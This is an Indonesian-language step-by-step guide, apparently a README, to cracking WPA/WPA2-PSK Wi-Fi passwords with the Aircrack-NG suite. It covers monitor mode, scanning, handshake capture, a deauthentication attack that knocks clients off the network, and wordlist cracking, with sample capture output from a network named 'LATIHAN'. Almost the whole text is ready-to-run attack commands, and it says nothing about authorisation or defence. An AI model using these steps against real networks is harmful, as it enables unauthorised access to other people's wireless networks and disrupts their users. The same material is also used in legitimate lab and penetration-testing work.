# Hack Wi-Fi WPA/WPA2-PSK (Aircrack-NG)

## Persyaratan
- PC/Laptop
- OS Linux
- Adapter Wi-Fi (support mode monitor)
- Aircrack-NG suite
- Wordlist
- Koneksi internet

## Instal Tool

```
sudo apt-get update
sudo apt-get install aircrack-ng
```

## Langkah-Langkah

#### 1. Aktifin Mode Monitor

```
sudo airmon-ng check kill
sudo airmon-ng start [interface]
```

#### 2. Scan Wi-Fi

```
sudo airodump-ng [interface]
```

#### 3. Capture Handshake

```
sudo airodump-ng -N [essid] -d [bssid] -c [channel] -w [output] [interface]
```

#### 4. Jalanin Serangan Deauth

```
sudo aireplay-ng -0 0 -a [bssid] -c [mac_client] [interface]
```

#### 5. Monitoring Hasil

```
CH 11 ][ Elapsed: 6 s ][ 2026-01-20 13:03 ][ WPA handshake: 84:16:F9:FE:64:68                                 
                                                                                                               
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID                           
                                                                                                               
 84:16:F9:FE:64:68  -38 100       63       25    8  11  130   WPA2 CCMP   PSK  LATIHAN                         
                                                                                                               
 BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes                             
                                                                                                               
 84:16:F9:FE:64:68  4A:F2:3B:A2:12:29  -33    1e- 1e     0       14  EAPOL
```

#### 6. Crack Handshake

```
aircrack-ng -a 2 -e [essid] -b [bssid] -l [output] [file_capture] -w [wordlist]
```
